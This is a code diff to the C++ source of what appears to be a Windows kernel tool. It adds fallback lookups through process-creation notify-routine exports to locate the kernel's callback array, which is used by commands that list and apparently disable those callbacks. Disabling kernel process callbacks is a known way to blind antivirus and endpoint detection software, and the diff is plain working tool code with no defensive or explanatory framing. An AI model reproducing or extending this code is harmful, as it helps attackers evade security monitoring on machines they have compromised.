@@ -185,9 +185,15 @@ void CmdNotify(bool doImage, bool doProcess, bool doThread) {
                        ? sections[0].arrayVA : 0;
         s.arrayVA = FindArrayViaExport(hNt, userBase, kernBase, s.exportFn,
                                        skip, dataBase, dataEnd);
-        // Fallback for CreateProcess: try Set/Ex variants if Remove isn't found
+        // Fallback for CreateProcess: try non-Ex Set, then Ex Set
         if (!s.arrayVA && strcmp(s.exportFn, "PsRemoveCreateProcessNotifyRoutine") == 0) {
-            DBG("CreateProcess: primary failed, trying Ex fallback\n");
+            DBG("CreateProcess: primary failed, trying non-Ex Set fallback\n");
+            s.arrayVA = FindArrayViaExport(hNt, userBase, kernBase,
+                                           "PsSetCreateProcessNotifyRoutine",
+                                           sections[0].arrayVA, dataBase, dataEnd);
+        }
+        if (!s.arrayVA && strcmp(s.exportFn, "PsRemoveCreateProcessNotifyRoutine") == 0) {
+            DBG("CreateProcess: non-Ex failed, trying Ex fallback\n");
             s.arrayVA = FindArrayViaExport(hNt, userBase, kernBase,
                                            "PsSetCreateProcessNotifyRoutineEx",
                                            sections[0].arrayVA, dataBase, dataEnd);
@@ -255,9 +261,12 @@ void CmdNotifyDisable(unsigned long long targetFn) {
     DWORD64 arrays[3]{};
     arrays[0] = FindArrayViaExport(hNt, userBase, kernBase, exportNames[0],
                                    0, dataBase, dataEnd);
-    // Try PsRemoveCreateProcessNotifyRoutine first; fall back to Ex variant
+    // Try Remove → non-Ex Set → Ex Set
     arrays[1] = FindArrayViaExport(hNt, userBase, kernBase, "PsRemoveCreateProcessNotifyRoutine",
                                    arrays[0], dataBase, dataEnd);
+    if (!arrays[1])
+        arrays[1] = FindArrayViaExport(hNt, userBase, kernBase, "PsSetCreateProcessNotifyRoutine",
+                                       arrays[0], dataBase, dataEnd);
     if (!arrays[1])
         arrays[1] = FindArrayViaExport(hNt, userBase, kernBase, exportNames[1],
                                        arrays[0], dataBase, dataEnd);
